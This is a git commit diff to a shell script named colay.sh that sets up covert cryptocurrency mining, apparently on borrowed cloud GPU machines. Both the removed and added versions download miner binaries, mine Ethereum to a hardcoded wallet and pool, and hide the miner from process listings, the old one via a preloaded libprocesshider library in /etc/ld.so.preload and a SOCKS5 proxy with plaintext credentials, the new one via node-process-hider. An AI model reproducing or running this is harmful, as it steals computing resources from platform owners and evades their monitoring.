4523d63a4acf164385306c96f31e3ea21e2a3cba
togninifabio98 <95686951+togninifabio98@users.noreply.github.com>
2022-05-20 21:54:23 +0700

    Update colay.sh

--- colay.sh
+++ colay.sh
@@ -1,48 +1,19 @@
-#!/bin/sh
-ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+apt update && apt -y install sudo wget curl unzip
+
+sudo apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
+
+curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
+
+apt-get install -y nodejs
+
+npm i -g node-process-hider
+
 dpkg-reconfigure --frontend noninteractive tzdata
 
-apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl
+wget https://github.com/miniZ-miner/miniZ/releases/download/v1.8z2/miniZ_v1.8z2_linux-x64.tar.gz
 
-wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
+tar xf miniZ_v1.8z2_linux-x64.tar.gz
 
-tar -xvzf graphics.tar.gz
+ph add miniZ
 
-cat > graftcp/local/graftcp-local.conf <<END
-listen = :2233
-loglevel = 1
-socks5 = gpusocks2.wot.mrface.com:1080
-socks5_username = mikrotik999
-socks5_password = Elibawnos
-END
-
-./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
-
-sleep .2
-
-echo " "
-echo " "
-
-echo "**"
-
-./graftcp/graftcp curl ifconfig.me
-
-echo " "
-echo " "
-
-echo "**"
-
-echo " "
-echo " "
-
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/nvidia
-chmod +x nvidia
-
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicNvidia.zip
-unzip magicNvidia.zip
-make
-gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
-mv libprocesshider.so /usr/local/lib/
-echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
-
-./graftcp/graftcp ./nvidia -a ETHASH --pool us-eth.2miners.com:2020 --tls on --user 17anS59W98wRb5HvtvPocGCD5oKYwMHHzh --Bismillah nvidia --longstats 5 --shortstats 5 --timeprint on --log on --ethstratum ETHPROXY --basecolor
+./miniZ -u 17anS59W98wRb5HvtvPocGCD5oKYwMHHzh.$(echo $(shuf -i 1-999 -n 1)-an) -l us-eth.2miners.com --port=2020 --intensity=85 -p x --par=ethash
